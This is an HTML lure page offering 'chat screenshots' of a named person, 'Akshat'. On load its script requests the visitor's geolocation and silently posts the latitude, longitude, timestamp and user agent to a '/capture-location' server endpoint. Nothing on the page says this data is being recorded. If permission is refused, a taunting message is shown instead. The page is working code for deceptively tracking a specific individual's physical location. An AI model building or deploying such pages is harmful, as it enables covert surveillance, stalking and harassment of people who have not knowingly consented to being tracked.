<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
        }
        .content, .denied {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
            padding: 20px;
        }
        img {
            max-width: 85%;
            margin: 25px 0;
            border: 2px solid #555;
            border-radius: 12px;
        }
        h2 {
            color: #ff5555;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>

    <!-- Screenshots shown only if location allowed -->
    <div class="content" id="content">
        <h1>Akshat Chat Screenshots</h1>
        <img src="/static/0jAV3.png" alt="">
        <img src="/static/dX66Z.png" alt="">
        <img src="/static/JQyOg.png" alt="">
        <img src="/static/aryUv.png" alt="">
        <img src="/static/CiyTj.png" alt="">
    </div>

    <!-- Denied Message -->
    <div class="denied" id="denied">
        <h2>Akshat we know its you</h2>
        <h2>We have blocked your location</h2>
        <h2>We ain't showing you what's in this website</h2>
        <img src="/static/satvik.jpg" alt="Akshat">
        <p style="margin-top: 40px; font-size: 20px;">😂</p>
    </div>

    <script>
        function requestLocation() {
            if (!navigator.geolocation) {
                showDenied();
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    fetch('/capture-location', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent
                        })
                    });
                    document.getElementById('content').style.display = 'flex';
                },
                () => {
                    showDenied();
                }
            );
        }

        function showDenied() {
            document.getElementById('denied').style.display = 'flex';
        }

        window.onload = requestLocation;
    </script>
</body>
</html>
